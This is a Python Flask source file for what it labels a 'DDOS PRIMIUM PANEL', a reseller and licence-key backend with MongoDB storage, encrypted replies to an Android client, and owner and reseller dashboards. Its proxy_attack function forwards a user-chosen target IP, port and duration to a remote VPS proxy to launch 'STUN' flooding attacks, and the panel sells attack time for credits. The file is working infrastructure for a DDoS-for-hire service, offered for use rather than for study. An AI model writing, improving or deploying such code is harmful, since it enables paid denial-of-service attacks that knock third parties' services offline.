import json
import os
import secrets
import hashlib
import hmac
import base64
import requests
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, make_response, send_from_directory
from functools import wraps
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from pymongo import MongoClient

# ══════════════════════════════════════════════════════════════════
# ENV LOADER — supports .env file (no external dep)
# Load order: ENV_FILE env var > alonexraj.env > .env
# Existing os.environ values are NOT overridden (real env wins).
# ══════════════════════════════════════════════════════════════════
def _load_env_file(path):
    if not path or not os.path.isfile(path):
        return False
    try:
        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if '=' not in line:
                    continue
                k, v = line.split('=', 1)
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if k and k not in os.environ:
                    os.environ[k] = v
        print(f"[✓ ENV] Loaded {path}")
        return True
    except Exception as e:
        print(f"[! ENV] Failed to load {path}: {e}")
        return False

_env_candidates = [os.environ.get('ENV_FILE'), 'panel.env', '.env']
for _p in _env_candidates:
    if _load_env_file(_p):
        break

app = Flask(__name__)

# ══════════════════════════════════════════════════════════════════
# CONFIG — values from .env, fallback to empty string
# Set them in panel.env (local) OR Render/Railway env vars (production)
# ══════════════════════════════════════════════════════════════════
app.secret_key = os.getenv('FLASK_SECRET_KEY', '') or secrets.token_hex(16)

# Owner credentials
OWNER_USER = os.getenv('OWNER_USER', '')
OWNER_PASS = os.getenv('OWNER_PASS', '')

# Shared secret keys — must match Android app
HMAC_SECRET = os.getenv('HMAC_SECRET', '')
AES_KEY = os.getenv('AES_KEY', '').encode('utf-8')

# Attack — via VPS Proxy
ATTACK_PROXY_URL = os.getenv('ATTACK_PROXY_URL', '')
PROXY_SECRET = os.getenv('PROXY_SECRET', '')
PROXY_METHOD = os.getenv('PROXY_METHOD', 'STUN')

# MongoDB
MONGO_URI = os.getenv('MONGO_URI', '')
MONGO_DB_NAME = os.getenv('MONGO_DB_NAME', 'alonexraj_panel')

# Warn loudly if critical vars are missing — but don't crash on import
_missing = [k for k, v in {
    'OWNER_USER': OWNER_USER, 'OWNER_PASS': OWNER_PASS,
    'HMAC_SECRET': HMAC_SECRET, 'MONGO_URI': MONGO_URI,
    'ATTACK_PROXY_URL': ATTACK_PROXY_URL,
}.items() if not v]
if _missing:
    print(f"[! WARN] Missing env vars: {', '.join(_missing)}. Configure them in env to enable full functionality.")

mongo_client = MongoClient(MONGO_URI) if MONGO_URI else None
db = mongo_client[MONGO_DB_NAME] if mongo_client else None

# Collections (None if DB not configured)
keys_col = db['keys'] if db is not None else None
connections_col = db['connections'] if db is not None else None
resellers_col = db['resellers'] if db is not None else None
history_col = db['key_history'] if db is not None else None
config_col = db['config'] if db is not None else None

# Credit rate: 10 credits = 1 hour
CREDITS_PER_HOUR = int(os.environ.get('CREDITS_PER_HOUR', '10'))


# ══════════════════════════════════════════════════════════════════
# DATA HELPERS — MongoDB
# ══════════════════════════════════════════════════════════════════
# Keep alive thread for Render free tier
import threading
import time
import requests

def keep_alive_ping():
    """Background thread to ping the app every 4 minutes"""
    while True:
        time.sleep(240)  # 4 minutes (Render idle timeout is 15 minutes)
        try:
            # Get the port from environment or use default
            port = int(os.environ.get('PORT', 3000))
            url = f"http://localhost:{port}/health"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"[✓ Keep-Alive] Ping successful at {datetime.utcnow().isoformat()}")
            else:
                print(f"[✗ Keep-Alive] Ping failed with status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[! Keep-Alive] Error: {e}")
        except Exception as e:
            print(f"[! Keep-Alive] Unexpected error: {e}")

# Health check endpoint for uptime monitoring
@app.route('/health', methods=['GET'])
def health_check():
    """Simple health check endpoint for keep-alive services"""
    return jsonify({
        'status': 'alive',
        'timestamp': datetime.utcnow().isoformat() + 'Z',
        'service': 'DDOS PRIMIUM PANEL',
        'version': '2.0'
    })

# Start keep-alive thread (only if not disabled via environment variable)
def start_keep_alive():
    """Initialize the keep-alive background thread"""
    if os.environ.get('DISABLE_KEEP_ALIVE', '').lower() != 'true':
        keep_alive_thread = threading.Thread(target=keep_alive_ping, daemon=True)
        keep_alive_thread.start()
        print("[✓ Keep-Alive] Background thread started successfully")
        print("[✓ Keep-Alive] Will ping every 4 minutes to prevent spin-down")
    else:
        print("[! Keep-Alive] Disabled via DISABLE_KEEP_ALIVE environment variable")
        
def load_keys():
    """Load active keys, auto-remove expired ones."""
    now = datetime.utcnow().isoformat() + 'Z'
    # Remove expired keys that have expires_at set and are past expiry
    all_keys = list(keys_col.find({}, {'_id': 0}))
    active_keys = []
    for k in all_keys:
        if not k.get('expires_at'):
            active_keys.append(k)  # Unredeemed — keep
            continue
        if k['expires_at'] > now:
            active_keys.append(k)  # Not expired — keep
        else:
            keys_col.delete_one({'id': k['id']})  # Expired — remove
    return active_keys

def save_key(record):
    """Insert or update a single key."""
    keys_col.update_one({'id': record['id']}, {'$set': record}, upsert=True)

def delete_key_by_id(key_id):
    keys_col.delete_one({'id': key_id})

def find_key_by_value(key_value):
    return keys_col.find_one({'key': key_value}, {'_id': 0})

def update_key(key_id, updates):
    keys_col.update_one({'id': key_id}, {'$set': updates})

def load_connections():
    doc = connections_col.find_one({'_type': 'connections'}, {'_id': 0})
    return doc.get('data', {}) if doc else {}

def save_connections(connections):
    connections_col.update_one({'_type': 'connections'}, {'$set': {'_type': 'connections', 'data': connections}}, upsert=True)

def load_resellers():
    return list(resellers_col.find({}, {'_id': 0}))

def find_reseller(username):
    return resellers_col.find_one({'username': username}, {'_id': 0})

def update_reseller(username, updates):
    resellers_col.update_one({'username': username}, {'$set': updates})

def delete_reseller_by_username(username):
    resellers_col.delete_one({'username': username})

def add_reseller(reseller):
    resellers_col.insert_one(reseller)

def load_history():
    return list(history_col.find({}, {'_id': 0}).sort('created_at', -1))

def save_history_record(record):
    history_col.insert_one(record)

def load_update_config():
    doc = config_col.find_one({'_type': 'update_config'}, {'_id': 0})
    if doc:
        doc.pop('_type', None)
        return doc
    return {"latest_version_code": 1, "latest_version_name": "1.0", "apk_filename": "", "changelog": ""}

def save_update_config(config):
    config['_type'] = 'update_config'
    config_col.update_one({'_type': 'update_config'}, {'$set': config}, upsert=True)


# ══════════════════════════════════════════════════════════════════
# CRYPTO + PROXY
# ══════════════════════════════════════════════════════════════════

def encrypt_response(data_dict):
    plaintext = json.dumps(data_dict).encode('utf-8')
    iv = os.urandom(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext, AES.block_size))
    return base64.b64encode(iv + ct).decode('utf-8')

def encrypted_reply(data_dict):
    encrypted = encrypt_response(data_dict)
    resp = make_response(encrypted, 200)
    resp.headers['Content-Type'] = 'application/octet-stream'
    return resp

def proxy_attack(ip, port, time_sec):
    """
    Forward attack request to VPS proxy — single request, STUN method.
    No TeamC2; only proxy.py.
    """
    try:
        r = requests.post(ATTACK_PROXY_URL, json={
            'secret': PROXY_SECRET,
            'ip': ip,
            'port': port,
            'time': time_sec,
            'method': PROXY_METHOD
        }, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "queued":
                launched = data.get("launchedCount", 1)
                return {
                    "status": "queued",
                    "message": data.get("message", "⚡ Attack Launched!"),
                    "target": f"{ip}:{port}",
                    "slots": {"active": launched, "available": max(8 - launched, 0), "max": 8},
                }
            return {"status": "error", "message": data.get("message", "Attack failed")}
        return {"status": "error", "message": f"Proxy returned {r.status_code}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def proxy_status():
    """Simple online check"""
    return {"status": "online"}

def sign_response(expires_at, device_id):
    msg = "{}|{}".format(expires_at or "", device_id or "")
    return hmac.HMAC(HMAC_SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()[:16]

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr


# ══════════════════════════════════════════════════════════════════
# RATE LIMITER (in-memory, per-IP) — login brute-force protection
# ══════════════════════════════════════════════════════════════════
import time as _time_mod
from collections import defaultdict
_login_attempts = defaultdict(list)   # ip -> [timestamp, ...]
_login_lockouts = {}                  # ip -> unlock_timestamp

# Config (override via env)
LOGIN_MAX_ATTEMPTS = int(os.environ.get('LOGIN_MAX_ATTEMPTS', '5'))
LOGIN_WINDOW_SEC = int(os.environ.get('LOGIN_WINDOW_SEC', '300'))    # 5 min
LOGIN_LOCKOUT_SEC = int(os.environ.get('LOGIN_LOCKOUT_SEC', '900'))  # 15 min

def login_check_rate(ip):
    """Returns (allowed: bool, retry_after_sec: int, attempts_remaining: int)."""
    now = _time_mod.time()
    # Currently locked out?
    unlock_at = _login_lockouts.get(ip)
    if unlock_at and now < unlock_at:
        return False, int(unlock_at - now), 0
    if unlock_at and now >= unlock_at:
        _login_lockouts.pop(ip, None)
        _login_attempts.pop(ip, None)
    # Prune old attempts
    cutoff = now - LOGIN_WINDOW_SEC
    _login_attempts[ip] = [t for t in _login_attempts[ip] if t > cutoff]
    remaining = LOGIN_MAX_ATTEMPTS - len(_login_attempts[ip])
    return True, 0, max(remaining, 0)

def login_record_failure(ip):
    """Record a failed login. Lock out IP if threshold exceeded."""
    now = _time_mod.time()
    _login_attempts[ip].append(now)
    if len(_login_attempts[ip]) >= LOGIN_MAX_ATTEMPTS:
        _login_lockouts[ip] = now + LOGIN_LOCKOUT_SEC
        print(f"[! RATE] Locked out IP {ip} for {LOGIN_LOCKOUT_SEC}s after {len(_login_attempts[ip])} failures")

def login_record_success(ip):
    """Clear the IP's failure counter on successful login."""
    _login_attempts.pop(ip, None)
    _login_lockouts.pop(ip, None)


# ══════════════════════════════════════════════════════════════════
# AUTH HELPERS
# ══════════════════════════════════════════════════════════════════

def is_owner():
    return session.get('role') == 'owner'

def is_reseller():
    return session.get('role') == 'reseller'

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

def owner_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not is_owner():
            return jsonify({'error': 'Owner access required'}), 403
        return f(*args, **kwargs)
    return decorated


# ══════════════════════════════════════════════════════════════════
# HTML TEMPLATES
# ══════════════════════════════════════════════════════════════════

LOGIN_TEMPLATE = '''<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Panel Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--card:#fff;--card-text:#1a1a2e;--card-muted:#888;--input-bg:#f4f0fa;--input-border:transparent;--input-text:#333;--input-placeholder:#aaa;--ft:#bbb}
[data-theme="dark"]{--card:#1a1d2e;--card-text:#f3f4f6;--card-muted:#9ca3af;--input-bg:#252938;--input-border:#3a3f54;--input-text:#f3f4f6;--input-placeholder:#6b7280;--ft:#6b7280}
body{font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#4a00e0,#8e2de2,#ff6b35);background-size:400% 400%;animation:g 12s ease infinite}
@keyframes g{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
.card{display:flex;background:var(--card);border-radius:20px;overflow:hidden;box-shadow:0 30px 60px rgba(0,0,0,.3);max-width:820px;width:90%;min-height:440px}
.left{flex:1;background:linear-gradient(135deg,#f0f0ff,#e8e0ff);display:flex;align-items:center;justify-content:center;padding:40px}
[data-theme="dark"] .left{background:linear-gradient(135deg,#252938,#2d3142)}
.left svg{width:100%;max-width:260px}
.right{flex:1;padding:50px 40px;display:flex;flex-direction:column;justify-content:center}
.right h2{font-size:24px;font-weight:700;color:var(--card-text);margin-bottom:6px}
.right .sub{font-size:13px;color:var(--card-muted);margin-bottom:28px}
.ig{margin-bottom:16px}
.ig input{width:100%;padding:14px 18px;background:var(--input-bg);border:2px solid var(--input-border);border-radius:12px;font-size:14px;color:var(--input-text);transition:border .2s}
.ig input:focus{outline:none;border-color:#7c3aed;background:var(--card)}
.ig input::placeholder{color:var(--input-placeholder)}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#7c3aed,#4a00e0);color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;transition:transform .15s,box-shadow .2s;margin-top:6px}
.btn:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(124,58,237,.35)}
.err{color:#dc2626;font-size:13px;margin-bottom:14px;padding:10px;background:#fef2f2;border-radius:8px}
[data-theme="dark"] .err{background:#3f1d1d;color:#f87171}
.ft{margin-top:18px;font-size:11px;color:var(--ft);text-align:center}
@media(max-width:700px){.card{flex-direction:column}.left{display:none}.right{padding:40px 28px}}
</style>
</head>
<body>
<div class="card">
<div class="left">
<svg viewBox="0 0 400 350" fill="none" xmlns="http://www.w3.org/2000/svg">
<rect x="120" y="160" width="160" height="130" rx="16" fill="#4a00e0"/>
<path d="M160 160V120a40 40 0 0180 0v40" stroke="#1a1a2e" stroke-width="18" fill="none" stroke-linecap="round"/>
<circle cx="200" cy="215" r="14" fill="#e8e0ff"/><rect x="195" y="225" width="10" height="24" rx="5" fill="#e8e0ff"/>
<g transform="translate(250,60) rotate(20)"><rect x="0" y="8" width="60" height="12" rx="6" fill="#ff6b35"/><circle cx="70" cy="14" r="18" stroke="#ff6b35" stroke-width="6" fill="none"/><rect x="10" y="20" width="8" height="12" rx="2" fill="#ff6b35"/><rect x="25" y="20" width="8" height="8" rx="2" fill="#ff6b35"/></g>
<circle cx="90" cy="250" r="12" fill="#1a1a2e"/><rect x="80" y="262" width="20" height="30" rx="8" fill="#7c3aed"/>
<circle cx="310" cy="275" r="12" fill="#1a1a2e"/><rect x="300" y="287" width="20" height="28" rx="8" fill="#ff6b35"/>
</svg>
</div>
<div class="right">
<h2>Owner / Seller Login</h2>
<p class="sub">Access your key management panel</p>
{% if error %}<div class="err">{{ error }}</div>{% endif %}
<form method="post">
<div class="ig"><input name="username" placeholder="Username" required autofocus></div>
<div class="ig"><input name="password" type="password" placeholder="Password" required></div>
<button type="submit" class="btn">Submit</button>
</form>
<div class="ft">Ddos Premium Panel</div>
</div>
</div>
<script>
(function(){let saved=null;try{saved=localStorage.getItem('theme');}catch(e){}
const t=saved||(window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');
document.documentElement.setAttribute('data-theme',t);})();
</script>
</body>
</html>'''

DASHBOARD_TEMPLATE = '''<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{{ title }}</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#f5f7fa;--surface:#fff;--surface-2:#f9fafb;--surface-3:#f3f4f6;
  --border:#e8ecf0;--border-2:#e2e8f0;--border-soft:#f0f2f5;--row:#f5f7fa;
  --text:#1a1a2e;--text-2:#444;--muted:#666;--soft:#888;--softer:#9ca3af;
  --primary:#4361ee;--link:#58a6ff;--row-hover:#f9fafb;--modal-bg:rgba(0,0,0,.4);
  --logout:#dc2626;--logout-bg:#fef2f2;--logout-hover:#fee2e2;
  --shadow-sm:0 1px 4px rgba(0,0,0,.04);--shadow:0 2px 8px rgba(0,0,0,.02);--shadow-lg:0 8px 20px rgba(0,0,0,.06);
  --modal-shadow:0 20px 40px rgba(0,0,0,.12);
}
[data-theme="dark"]{
  --bg:#0f1117;--surface:#1a1d2e;--surface-2:#252938;--surface-3:#2d3142;
  --border:#2a2e3f;--border-2:#3a3f54;--border-soft:#252938;--row:#252938;
  --text:#f3f4f6;--text-2:#d1d5db;--muted:#9ca3af;--soft:#9ca3af;--softer:#6b7280;
  --primary:#818cf8;--link:#60a5fa;--row-hover:#252938;--modal-bg:rgba(0,0,0,.7);
  --logout:#f87171;--logout-bg:#3f1d1d;--logout-hover:#5b2424;
  --shadow-sm:0 1px 4px rgba(0,0,0,.3);--shadow:0 2px 8px rgba(0,0,0,.4);--shadow-lg:0 8px 20px rgba(0,0,0,.5);
  --modal-shadow:0 20px 40px rgba(0,0,0,.6);
}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;transition:background .3s,color .3s}
.topbar{background:var(--surface);padding:14px 24px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;box-shadow:var(--shadow-sm)}
.topbar .brand{font-size:17px;font-weight:700;color:var(--primary)}
.topbar .user-info{display:flex;align-items:center;gap:14px;font-size:13px;color:var(--muted)}
.topbar .user-info span{color:var(--text)}
.topbar a.logout-link{color:var(--logout);background:var(--logout-bg);text-decoration:none;font-size:13px;font-weight:600;padding:6px 12px;border-radius:6px;transition:.15s}
.topbar a.logout-link:hover{background:var(--logout-hover)}
.theme-toggle{background:var(--surface-3);border:none;color:var(--text);width:32px;height:32px;border-radius:8px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:14px;transition:.2s}
.theme-toggle:hover{transform:scale(1.05)}
.theme-toggle .sun{display:none}.theme-toggle .moon{display:block}
[data-theme="dark"] .theme-toggle .sun{display:block}[data-theme="dark"] .theme-toggle .moon{display:none}
.container{max-width:1000px;margin:0 auto;padding:28px 20px}
.header-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.header-row h2{font-size:22px;font-weight:700;color:var(--text)}
.header-actions{display:flex;gap:10px;flex-wrap:wrap}
.btn{padding:10px 18px;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;transition:opacity .2s,transform .1s}
.btn:hover{opacity:.9;transform:translateY(-1px)}
.btn-blue{background:#4361ee;color:#fff}
.btn-green{background:#10b981;color:#fff}
.btn-red{background:#fee2e2;color:#dc2626}
[data-theme="dark"] .btn-red{background:#3f1d1d;color:#f87171}
.btn-purple{background:#8b5cf6;color:#fff}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:28px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:20px;transition:transform .15s,box-shadow .2s}
.stat-card:hover{transform:translateY(-2px);box-shadow:var(--shadow-lg)}
.stat-card .label{font-size:11px;color:var(--soft);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
.stat-card .value{font-size:26px;font-weight:700;color:var(--text)}
.section{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:22px;margin-bottom:18px;box-shadow:var(--shadow)}
.section-title{font-size:15px;font-weight:600;color:var(--text);margin-bottom:14px}
.form-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px}
.form-group label{display:block;font-size:11px;color:var(--soft);margin-bottom:5px;text-transform:uppercase;letter-spacing:.4px}
.form-group input,.form-group select{width:100%;padding:10px 12px;background:var(--surface-2);border:1px solid var(--border-2);border-radius:8px;color:var(--text);font-size:13px;transition:border .2s;font-family:inherit}
.form-group input:focus,.form-group select:focus{outline:none;border-color:#4361ee;background:var(--surface)}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:10px;font-size:11px;color:var(--soft);text-transform:uppercase;letter-spacing:.4px;border-bottom:2px solid var(--border-soft);background:var(--surface)}
td{padding:10px;font-size:12px;color:var(--text-2);border-bottom:1px solid var(--border-soft)}
tr:hover td{background:var(--row-hover)}
.badge{padding:3px 8px;border-radius:10px;font-size:10px;font-weight:600}
.badge-active{background:#d1fae5;color:#059669}
.badge-expired{background:#fee2e2;color:#dc2626}
.badge-unredeemed{background:#fef3c7;color:#d97706}
[data-theme="dark"] .badge-active{background:#0f3a2a;color:#34d399}
[data-theme="dark"] .badge-expired{background:#3f1d1d;color:#f87171}
[data-theme="dark"] .badge-unredeemed{background:#3f2d11;color:#fbbf24}
.mono{font-family:monospace;font-size:11px;color:var(--soft)}
.modal-bg{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:var(--modal-bg);z-index:200;align-items:center;justify-content:center}
.modal-bg.active{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:28px;width:90%;max-width:520px;max-height:90vh;overflow-y:auto;box-shadow:var(--modal-shadow)}
.modal h3{color:var(--text);margin-bottom:16px;font-size:18px}
.modal .close-btn{float:right;background:none;border:none;color:var(--softer);font-size:22px;cursor:pointer}
.modal .close-btn:hover{color:var(--text)}
.credit-badge{background:#fef3c7;color:#d97706;padding:4px 12px;border-radius:12px;font-size:12px;font-weight:600}
[data-theme="dark"] .credit-badge{background:#3f2d11;color:#fbbf24}
.countdown{font-family:monospace;font-size:11px;font-variant-numeric:tabular-nums}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
@keyframes fadeOut{0%,70%{opacity:1}100%{opacity:0;transform:translateY(-10px)}}
@media(max-width:600px){.cards{grid-template-columns:1fr 1fr}.form-grid{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="topbar">
<div class="brand">DDOS PANEL</div>
<div class="user-info">
<span>{{ display_name }}</span>
{% if role == 'reseller' %}<span class="credit-badge">{{ credits }} Credits</span>{% endif %}
<button class="theme-toggle" onclick="toggleTheme()" title="Toggle theme"><span class="sun">☀️</span><span class="moon">🌙</span></button>
<a class="logout-link" href="/logout">Sign out</a>
</div>
</div>
<div class="container" id="app"></div>

<div class="modal-bg" id="modalBg">
<div class="modal" id="modalContent"></div>
</div>

<script>
const ROLE = '{{ role }}';
const USERNAME = '{{ username }}';
const container = document.getElementById('app');
const modalBg = document.getElementById('modalBg');
const modalContent = document.getElementById('modalContent');

function closeModal(){modalBg.classList.remove('active')}
function showModal(html){modalContent.innerHTML=html;modalBg.classList.add('active')}
modalBg.addEventListener('click',e=>{if(e.target===modalBg)closeModal()});

async function api(url,opts){const r=await fetch(url,opts);return r.json();}

// Theme
function applyTheme(t){document.documentElement.setAttribute('data-theme',t);try{localStorage.setItem('theme',t);}catch(e){}}
function toggleTheme(){const cur=document.documentElement.getAttribute('data-theme')||'light';applyTheme(cur==='dark'?'light':'dark');}
(function(){let saved=null;try{saved=localStorage.getItem('theme');}catch(e){}
const t=saved||(window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');
applyTheme(t);})();

// Live countdown formatting
function fmtCountdown(ms){
  if(ms<=0)return '<span style="color:#dc2626;font-weight:700">EXPIRED</span>';
  const s=Math.floor(ms/1000);
  const d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60),sec=s%60;
  if(d>0)return `<span style="color:#10b981;font-weight:700">${d}d ${h}h ${m}m</span>`;
  if(h>0)return `<span style="color:#10b981;font-weight:700">${h}h ${m}m ${sec}s</span>`;
  if(m>0)return `<span style="color:#f59e0b;font-weight:700">${m}m ${sec}s</span>`;
  return `<span style="color:#dc2626;font-weight:700;animation:pulse 1s infinite">${sec}s</span>`;
}
setInterval(()=>{
  const now=Date.now();
  document.querySelectorAll('.countdown').forEach(el=>{
    const exp=el.dataset.exp;if(!exp)return;
    el.innerHTML=fmtCountdown(new Date(exp).getTime()-now);
  });
},1000);

const LIVE_WINDOW=120000; // 2 min

// ═══════════════════════════════════════════
// OWNER DASHBOARD
// ═══════════════════════════════════════════
async function renderOwnerDashboard(){
const allKeys=await api('/api/keys');
const resellers=await api('/api/resellers');
const history=await api('/api/history');
const now=new Date();
const nowMs=Date.now();
const keys=allKeys;
let activeKeys=0,expiredKeys=0,totalDevices=0,liveDevices=0;
allKeys.forEach(k=>{
  k.expires_at&&new Date(k.expires_at)>now?activeKeys++:(!k.expires_at?activeKeys++:expiredKeys++);
  totalDevices+=(k.locked_device_ids||[]).length;
  Object.values(k.devices_info||{}).forEach(info=>{
    if(info.last_seen&&(nowMs-new Date(info.last_seen).getTime())<LIVE_WINDOW)liveDevices++;
  });
});

container.innerHTML=`
<div class="header-row">
<h2>Owner Dashboard</h2>
<div class="header-actions">
<button class="btn btn-blue" onclick="showAddReseller()">+ Add Reseller</button>
<button class="btn btn-purple" onclick="showResellerList()">Reseller List</button>
</div>
</div>
<div class="cards">
<div class="stat-card"><div class="label">Total Keys</div><div class="value">${keys.length}</div></div>
<div class="stat-card"><div class="label">Active</div><div class="value">${activeKeys}</div></div>
<div class="stat-card"><div class="label">Resellers</div><div class="value">${resellers.length}</div></div>
<div class="stat-card"><div class="label">Devices</div><div class="value">${totalDevices}</div></div>
<div class="stat-card"><div class="label">Live Now 🟢</div><div class="value">${liveDevices}</div></div>
</div>
<div class="section">
<div class="section-title">Generate Key (Owner - Unlimited)</div>
<div class="form-grid">
<div class="form-group"><label>Prefix</label><input id="kName" placeholder="e.g. VIP"></div>
<div class="form-group"><label>Duration</label><input id="kDur" type="number" min="1" value="60"></div>
<div class="form-group"><label>Unit</label><select id="kUnit"><option value="minutes">Minutes</option><option value="hours">Hours</option><option value="days">Days</option></select></div>
<div class="form-group"><label>Devices</label><input id="kDev" type="number" min="1" value="1"></div>
</div>
<button class="btn btn-green" style="margin-top:14px" onclick="generateKey()">Generate</button>
<div id="genResult" style="margin-top:12px;font-size:12px;color:#8b949e;font-family:monospace"></div>
</div>
<div class="section">
<div class="section-title">My Keys</div>
<div style="overflow-x:auto"><table><thead><tr><th>Name</th><th>Key</th><th>Status</th><th>Time Left</th><th>Devices</th><th>By</th><th></th><th></th></tr></thead>
<tbody>${keys.map(k=>{
  const x=k.expires_at?new Date(k.expires_at)<now:false;
  const unredeemed=!k.redeemed;
  const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-unredeemed">Pending</span>':'<span class="badge badge-active">Active</span>');
  const timeCell=k.expires_at?`<span class="countdown" data-exp="${k.expires_at}">…</span>`:'<span style="color:#9ca3af;font-size:11px">awaits redeem</span>';
  const liveCount=Object.values(k.devices_info||{}).filter(d=>d.last_seen&&(nowMs-new Date(d.last_seen).getTime())<LIVE_WINDOW).length;
  const liveDot=liveCount>0?`<span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#10b981;box-shadow:0 0 5px #10b981;animation:pulse 1.5s infinite;margin-right:4px"></span>`:'';
  const liveTxt=liveCount>0?`<span style="color:#10b981;font-size:10px;font-weight:600;margin-left:3px">(${liveCount})</span>`:'';
  return `<tr><td>${k.name}</td><td class="mono" style="cursor:pointer;color:#58a6ff" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${timeCell}</td><td>${liveDot}${(k.locked_device_ids||[]).length}/${k.device_limit}${liveTxt}</td><td>${k.generated_by||'owner'}</td><td><button class="btn btn-blue" style="padding:4px 10px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button></td><td><button class="btn btn-red" onclick="deleteKey('${k.id}')">Del</button></td></tr>`;
}).join('')||'<tr><td colspan="8" style="color:#8b949e">No keys</td></tr>'}</tbody></table></div>
</div>
<div class="section">
<button class="btn btn-purple" onclick="showHistory()">Key History (All Time)</button>
<button class="btn btn-blue" style="margin-left:10px" onclick="showUpdateConfig()">⬆️ App Update Settings</button>
</div>`;
}

// ═══════════════════════════════════════════
// RESELLER DASHBOARD
// ═══════════════════════════════════════════
async function renderResellerDashboard(){
const data=await api('/api/my-dashboard');
const keys=data.keys||[];
const credits=data.credits||0;
const now=new Date();
const nowMs=Date.now();
let active=0,liveDevices=0;
keys.forEach(k=>{
  if(new Date(k.expires_at)>now)active++;
  Object.values(k.devices_info||{}).forEach(info=>{
    if(info.last_seen&&(nowMs-new Date(info.last_seen).getTime())<LIVE_WINDOW)liveDevices++;
  });
});

container.innerHTML=`
<div class="header-row">
<h2>Reseller Dashboard</h2>
<span class="credit-badge" style="font-size:14px">${credits} Credits</span>
</div>
<div class="cards">
<div class="stat-card"><div class="label">My Keys</div><div class="value">${keys.length}</div></div>
<div class="stat-card"><div class="label">Active</div><div class="value">${active}</div></div>
<div class="stat-card"><div class="label">Credits</div><div class="value">${credits}</div></div>
<div class="stat-card"><div class="label">Live Now 🟢</div><div class="value">${liveDevices}</div></div>
<div class="stat-card"><div class="label">Rate</div><div class="value">10/hr</div></div>
</div>
<div class="section">
<div class="section-title">Generate Key (10 credits = 1 hour)</div>
<div class="form-grid">
<div class="form-group"><label>Prefix</label><input id="kName" placeholder="e.g. Client"></div>
<div class="form-group"><label>Duration</label><input id="kDur" type="number" min="1" value="1"></div>
<div class="form-group"><label>Unit</label><select id="kUnit"><option value="minutes">Minutes</option><option value="hours" selected>Hours</option><option value="days">Days</option></select></div>
<div class="form-group"><label>Devices</label><input id="kDev" type="number" min="1" value="1"></div>
</div>
<button class="btn btn-green" style="margin-top:14px" onclick="resellerGenerate()">Generate (costs credits)</button>
<div id="genResult" style="margin-top:12px;font-size:12px;color:#8b949e;font-family:monospace"></div>
</div>
<div class="section">
<div class="section-title">My Keys</div>
<div style="overflow-x:auto"><table><thead><tr><th>Name</th><th>Key</th><th>Status</th><th>Time Left</th><th>Devices</th><th></th><th></th></tr></thead>
<tbody>${keys.map(k=>{
  const x=k.expires_at?new Date(k.expires_at)<now:false;
  const unredeemed=!k.redeemed;
  const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-unredeemed">Pending</span>':'<span class="badge badge-active">Active</span>');
  const timeCell=k.expires_at?`<span class="countdown" data-exp="${k.expires_at}">…</span>`:'<span style="color:#9ca3af;font-size:11px">awaits redeem</span>';
  const liveCount=Object.values(k.devices_info||{}).filter(d=>d.last_seen&&(nowMs-new Date(d.last_seen).getTime())<LIVE_WINDOW).length;
